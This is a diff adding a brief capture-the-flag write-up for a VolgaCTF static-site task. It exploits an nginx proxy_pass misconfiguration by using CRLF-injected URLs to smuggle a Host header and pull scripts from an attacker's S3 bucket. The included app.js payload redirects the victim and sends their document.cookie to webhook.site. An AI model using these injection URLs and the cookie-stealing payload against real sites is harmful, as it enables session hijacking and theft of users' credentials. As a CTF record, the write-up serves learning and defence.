@@ -1,0 +1,31 @@
+Source:
+	https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
+
+### official
+	https://static-site.volgactf-task.ru/static/xss.html%20HTTP/1.1%0d%0aHost:subdomain-takeover%0d%0a%0d%0a
+
+	xss.html
+	<script src="/static/xss.js%20HTTP/1.1%0d%0aHost:subdomain-takeover%0d%0a%0d%0a">
+	</script>
+
+
+### Solution
+
+default
+```
+location /static/ {
+  proxy_pass https://volga-static-site.s3.amazonaws.com$uri;
+}
+```
+
+https://static-site.volgactf-task.ru/static/index.html%20HTTP/1.0%0d%0aHost:%20xxx.s3.amazonaws.com%0d%0ayo:
+
+index.html
+```
+<script src="/static/app.js%20HTTP/1.0%0d%0aHost:%20xxx.s3.amazonaws.com%0d%0ayo:"></script>
+```
+
+app.js
+```
+window.location = 'https://webhook.site?c='+encodeURIComponent(document.cookie)
+```
